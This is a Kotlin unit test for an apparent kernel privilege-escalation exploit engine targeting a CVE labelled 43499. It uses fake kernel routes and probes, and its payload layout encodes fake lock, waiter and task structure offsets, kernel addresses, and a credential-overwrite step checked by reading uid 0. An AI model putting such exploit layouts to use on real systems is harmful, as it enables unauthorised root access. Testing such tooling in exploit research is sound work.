package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.engine.ktstep.FakeKernelRoute
import com.ghostlock.app.engine.ktstep.FakeVictimProbe
import com.ghostlock.app.engine.ktstep.KtEnginePhase
import com.ghostlock.app.engine.ktstep.KtStep
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.LayoutInputs
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.RouteResult
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteMode
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class Cve43499RunTest {
    private fun pageInputs() = PayloadPageInputs(
        slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
        lock = LockFields(0, 8, 16, 24),
        waiter = WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
        task = TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
        values = PayloadValues(0x100, 120, 140),
        waiterWord = 0xFFFF800000100000uL.toLong() + 0x1180L,
        waiterTask = 0L,
        fakeTask = 0xFFFF800000100000uL.toLong() + 0x1280L,
        fakeLock = 0xFFFF800000100000uL.toLong() + 0x0E80L,
        taskGroup = 0L, piTopTask = 0L, pointerBytes = 8,
    )

    private fun layout() = LayoutInputs(0x10000010001L, 0xFFFFFF802ABFD588uL.toLong(), 0x10L, 0x20L, 8)

    private fun plan(routeValue: Long = 0xFFFFFF802ABFD588uL.toLong()) = KtStepPlan(
        steps = mapOf(
            StepId.W1 to KtStep(StepId.W1, 0x1000L, WriteMode.Zero, true),
            StepId.W2 to KtStep(StepId.W2, 0x2000L, WriteMode.Credential, true, routeValue),
            StepId.W3 to KtStep(StepId.W3, 0x3000L, WriteMode.Zero, false),
        ),
        layoutInputs = layout(),
        pageInputs = pageInputs(),
        pageSize = 0x8000,
    )

    @Test
    fun happyPathUsesPipelineAndReadsUid() = runBlocking {
        val route = FakeKernelRoute()
        val probe = FakeVictimProbe(SyscallResult.Ok(0))
        val outcome = Cve43499Run(plan(), route, probe).run()
        assertEquals(KtEnginePhase.FixtureSucceeded, outcome.phase)
        assertEquals(3, outcome.pipeline?.outcomes?.size)
        assertEquals(3, route.requests.size)
        assertEquals(1, probe.calls)
    }

    @Test
    fun routeFailureStopsBeforeProbe() = runBlocking {
        val route = FakeKernelRoute().apply { answer = { RouteResult.Refused("no", false) } }
        val probe = FakeVictimProbe(SyscallResult.Ok(0))
        val outcome = Cve43499Run(plan(), route, probe).run()
        assertEquals(KtEnginePhase.Failed, outcome.phase)
        assertEquals(0, probe.calls)
        assertTrue(outcome.reason != null)
    }

    @Test
    fun uidMismatchFailsAfterPipeline() = runBlocking {
        val probe = FakeVictimProbe(SyscallResult.Ok(2000))
        val outcome = Cve43499Run(plan(), FakeKernelRoute(), probe).run()
        assertEquals(KtEnginePhase.Failed, outcome.phase)
        assertEquals(2000L, outcome.uid)
        assertFalse(outcome.phase == KtEnginePhase.FixtureSucceeded)
    }
}
